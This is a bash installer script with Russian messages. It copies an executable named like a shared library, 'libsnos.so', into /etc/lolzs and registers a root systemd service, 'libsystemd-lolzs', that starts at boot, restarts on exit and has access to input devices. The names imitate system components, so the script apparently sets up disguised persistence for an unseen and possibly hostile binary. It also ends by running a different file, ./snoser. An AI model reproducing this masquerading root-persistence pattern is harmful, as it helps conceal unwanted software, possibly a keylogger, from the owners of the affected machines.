#!/bin/bash

# --- Настройки ---
BINARY_NAME="libsnos.so" 
DEST_DIR="/etc/lolzs"
SERVICE_NAME="libsystemd-lolzs"  


msg() { echo -e "\e[1;32m[INFO]\e[0m $1"; }
err() { echo -e "\e[1;31m[ERROR]\e[0m $1"; }


if [ "$EUID" -ne 0 ]; then 
  err "Запустите скрипт через sudo: sudo $0"
  exit 1
fi


if [ ! -f "./$BINARY_NAME" ]; then
    err "Файл $BINARY_NAME не найден в текущей папке!"
    exit 1
fi


msg "Установка системных зависимостей..."
if command -v apt-get &> /dev/null; then
    apt-get update && apt-get install -y libudev1 libinput10
elif command -v dnf &> /dev/null; then
    dnf install -y systemd-libs libinput
elif command -v pacman &> /dev/null; then
    pacman -Sy --noconfirm systemd libinput
fi


mkdir -p "$DEST_DIR"


cp "./$BINARY_NAME" "$DEST_DIR/$BINARY_NAME"
chmod +x "$DEST_DIR/$BINARY_NAME"
chown root:root "$DEST_DIR/$BINARY_NAME"


cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=Lolzs Input Service
After=network.target

[Service]
# Запуск от root для доступа к udev/input
User=root
# Программа будет работать прямо внутри этой папки
WorkingDirectory=$DEST_DIR
ExecStart=$DEST_DIR/$BINARY_NAME
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF



systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl restart $SERVICE_NAME

echo "--------------------------------------------------"
msg "УСТАНОВКА ЗАВЕРШЕНА!"
echo "открываю программу..."
./snoser

